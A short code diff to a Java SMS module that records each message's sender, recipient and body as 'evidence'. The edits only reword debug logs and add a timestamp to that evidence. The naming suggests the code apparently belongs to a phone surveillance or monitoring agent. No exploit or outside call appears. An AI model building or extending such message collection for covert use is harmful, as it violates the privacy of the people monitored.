@@ -129,7 +129,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			if (!config[ID_SMS].equals(oldConfig[ID_SMS])) {
 				// configSmsChanged = true;
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): remove SMS markup");
+					Check.log(TAG + " (parse) storedSMS: remove SMS markup");
 				}
 				storedSMS.removeMarkup();
 			}
@@ -299,7 +299,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private void initSms() {
 		lastSMS = storedSMS.unserialize(new Integer(0));
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (initSms): lastSMS: " + lastSMS);
+			Check.log(TAG + " (initSms): storedSMS lastSMS: " + lastSMS);
 		}
 
 	}
@@ -335,7 +335,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	public synchronized void updateMarkupSMS(int value) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (updateMarkupSMS): " + value);
+			Check.log(TAG + " (updateMarkupSMS) storedSMS: " + value);
 		}
 		storedSMS.serialize(value);
 		lastSMS = value;
@@ -604,7 +604,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
 		databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
 
-		EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body);
+		EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body, new Date(date));
 
 		return isStopRequested();
 	}
